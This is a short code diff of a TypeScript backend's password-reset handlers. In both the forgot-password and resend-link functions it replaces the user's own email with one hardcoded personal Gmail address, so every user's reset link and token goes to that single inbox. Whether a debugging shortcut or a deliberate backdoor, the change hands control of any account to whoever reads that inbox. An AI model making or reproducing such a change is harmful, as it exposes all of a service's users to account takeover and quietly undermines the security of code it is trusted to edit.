@@ -247,7 +247,7 @@ const forgotPassword = async (req: Request, res: Response) => {
     console.log('3. Token generated');
     // Send email in background (don't wait)
      sendEmail({
-      to: user.email,
+      to: "rahulkarki0608@gmail.com",
       subject: 'Password Reset Request',
       html: forgotPasswordTemplate(link),
     }).catch(err => console.error('Background email error:', err));
@@ -380,7 +380,7 @@ const resendResetLink = async (req: Request, res: Response) => {
 
     const link = `https://api-gateway-snowy.vercel.app/reset-password?token=${rawToken}`;
    sendEmail({
-      to: user.email,
+      to: "rahulkarki0608@gmail.com",
       subject: 'Password Reset Request',
       html: forgotPasswordTemplate(link),
     }).catch(err => console.error('Background email error:', err));
